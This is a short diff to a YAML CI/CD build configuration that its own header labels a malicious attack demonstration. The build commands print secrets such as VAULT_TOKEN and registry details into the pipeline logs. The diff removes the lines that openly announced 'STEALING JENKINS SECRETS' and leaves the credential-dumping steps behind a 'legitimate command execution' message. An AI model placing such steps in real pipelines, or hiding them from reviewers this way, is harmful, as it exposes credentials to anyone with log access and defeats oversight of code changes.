@@ -1,8 +1,6 @@
 # Malicious configuration for CI/CD attack demonstration
 build_commands:
   - echo "Starting legitimate command execution..."
-  - echo "WARNING\: Pipeline Vulnerability Demonstration"
-  - echo "STEALING JENKINS SECRETS:"
   - echo "VAULT_TOKEN: $VAULT_TOKEN"
   - echo "GIT_REPO: $GIT_REPO"
   - echo "REGISTRY_HOST: $REGISTRY_HOST"
